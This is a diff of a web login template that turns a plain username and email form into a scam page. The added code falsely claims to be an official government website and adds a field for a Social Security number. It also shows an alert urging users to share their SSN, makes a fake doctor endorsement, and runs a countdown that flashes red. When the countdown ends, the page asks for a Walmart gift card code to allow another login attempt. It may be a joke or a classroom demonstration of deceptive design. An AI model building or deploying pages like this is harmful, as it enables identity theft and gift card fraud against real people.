@@ -1,13 +1,109 @@
 <div>
+<script>
+    alert("Only cool kids know and share their SSN");
+</script>
   {{#login}}
+    <div class="col-12 alert alert-danger text-center" id="timer">
+        <p>This is an official Government website</p>
+        <h3 id="countdown">Loading...</h3>
+    </div>
     <h2>Log in</h2>
     <form action="/login" method="post">
-        Username: <input name="username" type="text" /> <br />
-        Email: <input name="email" type="text" /> <br />
+        <div class="form-group">
+            <div class="input-group mb-3">
+                <span class="input-group-text" id="inputGroup-sizing-default">Username</span>
+                <input id="#username_input" type="text" name="username" class="form-control">
+            </div>
+        </div>
+        
+        <div class="form-group">
+            <div class="input-group mb-3">
+                <span class="input-group-text" id="inputGroup-sizing-default">Email</span>
+                <input id="#email_input" type="text" name="email" class="form-control">
+            </div>
+        </div>
+        
+        <div class="form-group">
+            <div class="input-group mb-3">
+                <span class="input-group-text" id="inputGroup-sizing-default">SSN</span>
+                <input id="#ssn_input" type="text" name="ssn" class="form-control">
+            </div>
+        </div>
+
+        {{!-- Username: <input id="#username_input" class="my-2" name="username" type="text" /> <br /> --}}
+        {{!-- Email: <input id="#email_input" class="my-2" name="email" type="text" /> <br />
+        SSN: <input id="#ssn_input" class="my-2" name="ssn" type="text" /> <br /> --}}
+        {{!-- <p>This is an official Government sponsored website.</p> --}}
         <br />
-        <input type="submit" name="submit" value="submit" />
+        <input class="btn btn-success" type="submit" name="submit" value="Submit" />
     </form>
-    <hr/>
+    <i class="m-5">
+        <h1 style='position:fixed; bottom:0; color:red;'>9 out of 10 doctors recommend this app 👨‍⚕️👩‍⚕️</h1>
+    </i>
   {{/login}}
 </div>
 
+<script>
+// Set the date we're counting down to
+var countDownDate = new Date();
+countDownDate.setSeconds(countDownDate.getSeconds() + 30)
+
+// Update the count down every 1 second
+var x = setInterval(function() {
+
+  // Get today's date and time
+  var now = new Date().getTime();
+
+  // Find the distance between now and the count down date
+  var distance = countDownDate - now;
+
+  // Time calculations for days, hours, minutes and seconds
+  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+  // Display the result in the element with id="countdown"
+  document.getElementById("countdown").innerHTML = minutes + "m " + seconds + "s";
+
+  // If the count down is finished, write some text
+  if (seconds == 10) {
+    if (!isFlashing) {
+        startFlashing();
+    }
+  }
+
+  if (distance < 0) {
+    stopFlashing();
+    clearInterval(x);
+    document.getElementById("countdown").innerHTML = '<div><p>Enter Walmart gift card code for another access attempt</p><input class="my-2" name="walmart_code" type="text" /><button>Send</button></div>';
+    var divElement = document.getElementById("timer");
+    
+  }
+}, 1000);
+
+let flashingInterval;
+let isFlashing = false;
+
+function flashRed() {
+    document.body.style.backgroundColor = 'red';
+    setTimeout(() => {
+    document.body.style.backgroundColor = '';
+    }, 500);
+}
+
+function startFlashing() {
+    if (!isFlashing) {
+    flashingInterval = setInterval(flashRed, 1000); // Flash every 1 second
+    isFlashing = true;
+    }
+}
+
+function stopFlashing() {
+    if (isFlashing) {
+    clearInterval(flashingInterval);
+    document.body.style.backgroundColor = '';
+    isFlashing = false;
+    }
+}
+  </script>
